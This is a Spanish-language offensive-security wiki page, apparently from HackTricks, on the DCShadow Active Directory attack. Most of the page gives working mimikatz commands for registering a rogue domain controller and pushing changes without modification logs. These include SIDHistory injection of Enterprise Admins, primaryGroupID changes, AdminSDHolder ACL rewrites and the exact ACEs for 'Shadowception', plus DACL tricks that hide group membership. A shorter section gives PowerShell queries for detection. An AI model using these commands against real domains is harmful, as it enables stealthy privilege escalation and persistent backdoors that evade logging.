# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Información básica

Se registra un **nuevo Domain Controller** en el AD y se usa para **push attributes** (SIDHistory, SPNs...) en objetos especificados **sin** dejar ningún **log** respecto a las **modificaciones**. **Necesitas DA** privilegios y estar dentro del **root domain**.\
Ten en cuenta que si usas datos incorrectos, aparecerán logs bastante feos.

Para realizar el ataque necesitas 2 instancias de mimikatz. Una de ellas iniciará los RPC servers con privilegios SYSTEM (tienes que indicar aquí los cambios que quieres realizar), y la otra instancia se usará para push the values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Nota que **`elevate::token`** no funcionará en una sesión `mimikatz1` ya que eso elevó los privilegios del hilo, pero necesitamos elevar el **privilegio del proceso**.\
También puedes seleccionar un objeto LDAP: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Puedes aplicar los cambios desde un DA o desde un usuario con estos permisos mínimos:

- En el **objeto de dominio**:
- _DS-Install-Replica_ (Agregar/Eliminar réplica en el dominio)
- _DS-Replication-Manage-Topology_ (Administrar la topología de replicación)
- _DS-Replication-Synchronize_ (Sincronización de replicación)
- El **Sites object** (y sus hijos) en el **Configuration container**:
- _CreateChild and DeleteChild_
- El objeto del **equipo que está registrado como DC**:
- _WriteProperty_ (No Write)
- El **target object**:
- _WriteProperty_ (No Write)

Puedes usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para dar estos privilegios a un usuario sin privilegios (ten en cuenta que esto dejará algunos registros). Esto es mucho más restrictivo que tener privilegios de DA.\
Por ejemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Esto significa que el nombre de usuario _**student1**_ cuando inicia sesión en la máquina _**mcorp-student1**_ tiene permisos DCShadow sobre el objeto _**root1user**_.

## Usando DCShadow para crear backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Abuso del grupo primario, brechas en la enumeración y detección

- `primaryGroupID` es un atributo separado de la lista de `member` del grupo. DCShadow/DSInternals puede escribirlo directamente (p. ej., establecer `primaryGroupID=512` para **Domain Admins**) sin la aplicación de LSASS en la máquina, pero AD aún **mueve** al usuario: cambiar el PGID siempre elimina la pertenencia del anterior grupo primario (mismo comportamiento para cualquier grupo objetivo), por lo que no puedes mantener la pertenencia antigua al grupo primario.
- Las herramientas por defecto impiden eliminar a un usuario de su grupo primario actual (`ADUC`, `Remove-ADGroupMember`), por lo que cambiar el PGID normalmente requiere escrituras directas en el directorio (DCShadow/`Set-ADDBPrimaryGroup`).
- La generación de informes de membresía es inconsistente:
- **Incluye** miembros derivados del grupo primario: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Omite** miembros derivados del grupo primario: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit al inspeccionar `member`, `Get-ADUser <user> -Properties memberOf`.
- Las comprobaciones recursivas pueden pasar por alto a los miembros del grupo primario si el **grupo primario está anidado** (p. ej., el PGID del usuario apunta a un grupo anidado dentro de Domain Admins); `Get-ADGroupMember -Recursive` o los filtros recursivos LDAP no devolverán a ese usuario a menos que la recursión resuelva explícitamente los grupos primarios.
- Trucos de DACL: los atacantes pueden **deny ReadProperty** sobre `primaryGroupID` en el usuario (o sobre el atributo `member` del grupo para grupos no protegidos por AdminSDHolder), ocultando la pertenencia efectiva de la mayoría de las consultas PowerShell; `net group` aún resolverá la pertenencia. Los grupos protegidos por AdminSDHolder restablecerán tales denegaciones.

Ejemplos de detección/monitoreo:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Verifica los grupos privilegiados comparando la salida de `Get-ADGroupMember` con `Get-ADGroup -Properties member` o ADSI Edit para detectar discrepancias introducidas por `primaryGroupID` o atributos ocultos.

## Shadowception - Dar permisos a DCShadow usando DCShadow (sin registros de permisos modificados)

Necesitamos añadir las siguientes ACEs con el SID de nuestro usuario al final:

- En el objeto de dominio:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- En el objeto del equipo atacante: `(A;;WP;;;UserSID)`
- En el objeto del usuario objetivo: `(A;;WP;;;UserSID)`
- En el objeto Sites en el contenedor Configuration: `(A;CI;CCDC;;;UserSID)`

Para obtener la ACE actual de un objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Ten en cuenta que en este caso necesitas realizar **varios cambios**, no solo uno. Por lo tanto, en la **sesión mimikatz1** (servidor RPC) usa el parámetro **`/stack` con cada cambio** que quieras realizar. De este modo, solo necesitarás **`/push`** una vez para aplicar todos los cambios pendientes en el servidor rogue.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
